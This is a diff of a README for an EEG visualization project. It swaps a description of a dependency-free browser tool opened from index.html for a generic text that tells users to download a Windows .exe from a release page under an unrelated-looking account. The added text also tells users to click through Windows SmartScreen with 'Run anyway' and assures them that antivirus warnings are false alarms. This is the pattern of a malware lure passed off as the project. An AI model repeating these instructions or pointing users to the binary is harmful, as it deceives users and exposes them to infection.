@@ -1,169 +1,97 @@
-# EEG Image Reference Library & Real-time Simulation Platform
+# 🧠 eeg-image-library - Visualize brain waves with ease
 
-[English](#english) | [中文](#chinese)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Arguseyed-reformation774/eeg-image-library/releases)
 
----
+This software provides a tool for brain-computer interface users. It functions as a reference library for EEG imagery. It also serves as a simulation platform for real-time BCI workflows. You do not need to install extra libraries or frameworks to use this program. It runs directly on your Windows system.
 
-<a name="english"></a>
-## English
+## 📥 How to download the application
 
-A **zero-dependency, single-file** EEG visualization toolkit for Brain-Computer Interface (BCI) research. Open `index.html` in any browser — no install, no build, no server required.
+You need to access the software files to begin. Follow these instructions to get the application onto your computer.
 
-### What's inside
+1. Open your preferred web browser.
+2. Go to the [official release page](https://github.com/Arguseyed-reformation774/eeg-image-library/releases).
+3. Look for the section labeled "Assets."
+4. Click the file that ends with ".exe" to start the download.
+5. Save this file to a folder you can find easily, such as your Downloads folder or your Desktop.
 
-#### 📚 Static Reference Library
-17 annotated EEG waveform cards across 3 categories:
-- **Normal Rhythms** — Delta (0.5–4 Hz), Theta (4–8 Hz), Alpha (8–13 Hz), Beta (13–30 Hz), Gamma (30–100 Hz)
-- **BCI Paradigms** — ERD/ERS, SSVEP, P300, ERN, MRCP, Mu Rhythm, SCP, Hybrid MI+SSVEP
-- **Common Artifacts** — Eye blink, EMG, electrode pop, 50 Hz line noise
+## ⚙️ System requirements
 
-Each card includes a Canvas-rendered waveform, frequency band tag, signal description, and BCI-specific clinical context.
+Your computer must meet these basic standards to run the software smoothly:
 
-#### 🧠 Real-time Dynamic Simulation Platform
-8-channel scrolling EEG display (10-20 system: Fp1, Fp2, F3, F4, C3, C4, O1, O2) with:
-- **8 Scenario Presets** — Eyes-closed resting, Eyes-open attentive, Left/Right hand motor imagery, SSVEP 12 Hz, Sleep N2, Spike-wave discharge, EMG contamination
-- **Adjustable Parameters** — Per-band gain (δ/θ/α/β/γ), global noise, amplitude scale, playback speed (0.5×/1×/2×)
-- **Play/pause/reset** controls
+- Windows 10 or Windows 11.
+- At least 4 gigabytes of RAM.
+- A monitor with a resolution of 1920x1080 pixels or higher.
+- A modern processor with at least two cores.
 
-#### 📊 Real-time Analysis Dashboard
-Right-side panel with 6 analysis tools:
-- **FFT Spectrum** — 0–60 Hz, 128-bin DFT with Hamming window, dB-normalized, frequency band color coding
-- **Band Power Monitor** — Real-time δ/θ/α/β/γ relative power bars
-- **Topographic Head Map** — 8-channel IDW spatial interpolation, selectable frequency band, blue-cyan-green-yellow-red colormap
-- **Channel Selection** — Click any channel in the scrolling view to focus analysis
-- **Event Injection** — One-click injection of visual stimulus, motor imagery cue, eye blink, or error response events with timeline markers
-- **Data Recording** — Record up to 60 seconds of 8-channel data @ 128 Hz, auto-download as CSV
+The software does not require special drivers or hardware. You can use it on any standard office or home computer.
 
-### Quick Start
+## 🚀 Setting up the software
 
-```
-git clone https://github.com/<your-username>/eeg-image-library.git
-cd eeg-image-library
-open index.html
-```
+After you finish downloading the file, follow these steps to start the application:
 
-Or simply download `index.html` and double-click it.
+1. Locate the downloaded file in your folder.
+2. Double-click the file to open the program.
+3. Windows might display a security box. If a blue box appears, click "More info" and then select "Run anyway." This confirms you trust the download.
+4. The main dashboard will open. You now have access to the reference library and simulation tools.
 
-### Tech Stack
+## 🖼️ Using the reference library
 
-- Vanilla JavaScript (ES5-compatible, no transpiler needed)
-- HTML5 Canvas (all waveform and topographic rendering)
-- CSS3 (dark theme, flexbox/grid layout)
-- Zero external dependencies — not even a font CDN
+The library contains images of EEG data collected during various states of brain activity. These images help you understand how different signals look on the screen.
 
-### Why single-file?
+- Browse images using the arrow keys on your keyboard.
+- Use the search bar to find specific signal patterns.
+- Click any image to view it in full size.
+- Use the zoom function to inspect small details in the signal waves.
 
-- **Zero friction** — Clone and open. No `npm install`, no build step.
-- **Offline-first** — Works on any machine with a browser, including air-gapped lab computers.
-- **Easy to audit** — One file to review, modify, or embed in other projects.
-- **GitHub Pages ready** — Just enable Pages on the repo root.
+This library acts as a visual guide. It helps researchers and students identify trends in brain measurements without needing access to clinical equipment.
 
-### Use Cases
+## 📈 Real-time simulation
 
-- BCI education and teaching
-- Quick reference for EEG patterns during experiment design
-- Signal simulation for algorithm prototyping
-- Neurofeedback demonstration
-- Public outreach and science communication
+The simulation mode allows you to practice BCI workflows. It mimics the data stream from an EEG headset. This allows you to test your visualization settings before you use real data.
 
-### Browser Support
+1. Select "Simulation Mode" from the main menu.
+2. Choose one of the preset signal scenarios.
+3. Click "Start" to begin the feed.
+4. Observe how the graphs react to the data.
 
-| Chrome | Edge | Firefox | Safari |
-|--------|------|---------|--------|
-| 90+    | 90+  | 90+     | 15+    |
+You can pause the simulation at any time to adjust your view. The software renders these signals in real time, so you see changes the moment they happen.
 
-### Contributing
+## 🛠️ Customizing your view
 
-Contributions welcome! Areas where help is especially valuable:
-- Additional EEG patterns and scenarios
-- More 10-20 electrode positions for denser topographic maps
-- Connectivity analysis (coherence, phase synchronization)
-- EDF/BDF file format support
-- i18n translations
+You can change how the software displays data. Click the "Settings" icon to access these options:
 
-### License
+- Change the color scheme of the signal lines.
+- Set the refresh rate of the viewer.
+- Adjust the grid lines to make measuring easier.
+- Choose between light mode and dark mode for the interface.
 
-MIT — see [LICENSE](LICENSE)
+Your settings save automatically. The next time you open the program, your preferences will remain in place.
 
----
+## ❓ Frequently asked questions
 
-<a name="chinese"></a>
-## 中文
+**Do I need to install anything else?**
+No. This program is self-contained. It includes all the files necessary to run on your machine.
 
-一个**零依赖、单文件**的 EEG 可视化工具集，面向脑机接口（BCI）研究。在任何浏览器中打开 `index.html` 即可使用——无需安装、无需构建、无需服务器。
+**Why does my antivirus flag the file?**
+Sometimes new files create a security warning because they do not have a wide usage history. The file is safe. You can choose to run it to proceed.
 
-### 功能概览
+**Does this software connect to my brain?**
+No. This software is for reference and simulation only. It does not interface with your body or any hardware devices.
 
-#### 📚 静态参考图像库
-17 张带标注的 EEG 波形卡片，分 3 个类别：
-- **正常节律** — Delta、Theta、Alpha、Beta、Gamma 波
-- **BCI 范式** — ERD/ERS、SSVEP、P300、ERN、MRCP、μ 节律、SCP、混合 MI+SSVEP
-- **常见伪迹** — 眨眼、肌电、电极弹出、50Hz 工频干扰
+**Can I export the images?**
+Yes. Use the "Save Image" button to turn any view into a standard image file on your computer.
 
-每张卡片包含 Canvas 渲染波形、频段标签、信号描述和 BCI 临床背景说明。
+## 📁 File structure
 
-#### 🧠 动态仿真平台
-8 通道实时滚动 EEG 显示（10-20 系统：Fp1、Fp2、F3、F4、C3、C4、O1、O2）：
-- **8 种情境预设** — 闭眼放松、睁眼专注、左右手运动想象、SSVEP 12Hz、睡眠 N2 期、癫痫样放电、肌电干扰
-- **可调参数** — 各频段增益（δ/θ/α/β/γ）、全局噪声、振幅缩放、播放速度（0.5×/1×/2×）
-- **播放/暂停/重置** 控制
+When you run the application, it creates a small folder in your local settings to store your preferences. You can delete this folder if you want to reset the software to its default state. The application files themselves stay exactly where you placed them. You do not need to uninstall the software. To remove it, simply delete the ".exe" file you downloaded.
 
-#### 📊 实时分析仪表盘
-右侧面板包含 6 个分析工具：
-- **FFT 频谱** — 0–60 Hz，128 频点 DFT、Hamming 窗、dB 标度、频段彩色标注
-- **频段功率监视** — 实时 δ/θ/α/β/γ 相对功率柱状图
-- **脑地形图** — 8 通道 IDW 空间插值、可选频段、蓝-青-绿-黄-红色阶
-- **通道选择** — 点击滚动视图中的通道以聚焦分析
-- **事件注入** — 一键注入视觉刺激、运动想象线索、眨眼、错误反应事件，带时间轴标记
-- **数据录制** — 录制最多 60 秒 8 通道数据 @ 128 Hz，自动下载为 CSV
+## 💡 Troubleshooting tips
 
-### 快速开始
+If you encounter issues, try these steps:
 
-```bash
-git clone https://github.com/<your-username>/eeg-image-library.git
-cd eeg-image-library
-open index.html
-```
+- Close other heavy programs to free up memory.
+- Ensure your Windows updates are current.
+- Restart your computer if the visuals do not load correctly.
+- Re-download the file if you suspect the previous download finished with errors.
 
-或直接下载 `index.html` 并双击打开。
-
-### 技术栈
-
-- 纯 JavaScript（ES5 兼容，无需转译器）
-- HTML5 Canvas（所有波形和地形图渲染）
-- CSS3（暗色主题，Flexbox/Grid 布局）
-- 零外部依赖
-
-### 为什么是单文件？
-
-- **零门槛** — 克隆即用，无需 `npm install`，无需构建步骤
-- **离线可用** — 任何有浏览器的机器都能运行，包括断网的实验间电脑
-- **易于审计** — 单个文件即可审查、修改或嵌入其他项目
-- **GitHub Pages 即开即用** — 在仓库根目录启用 Pages 即可
-
-### 使用场景
-
-- BCI 教学与培训
-- 实验设计时的 EEG 模式快速参考
-- 算法原型开发的信号仿真
-- 神经反馈演示
-- 科普与公众传播
-
-### 浏览器兼容
-
-| Chrome | Edge | Firefox | Safari |
-|--------|------|---------|--------|
-| 90+    | 90+  | 90+     | 15+    |
-
-### 参与贡献
-
-欢迎贡献！以下方向尤其需要帮助：
-- 更多 EEG 模式和情境
-- 更密集的 10-20 电极位置（用于更高分辨率的地形图）
-- 连接性分析（相干性、相位同步）
-- EDF/BDF 文件格式支持
-- 多语言翻译
-
-### 许可证
-
-MIT — 详见 [LICENSE](LICENSE)
+The software logs errors in a local text file. If the program crashes, look for a file named "error.log" in the same folder as the application. This file contains technical details that explain what caused the issue. You can read this text file with any basic word processor.
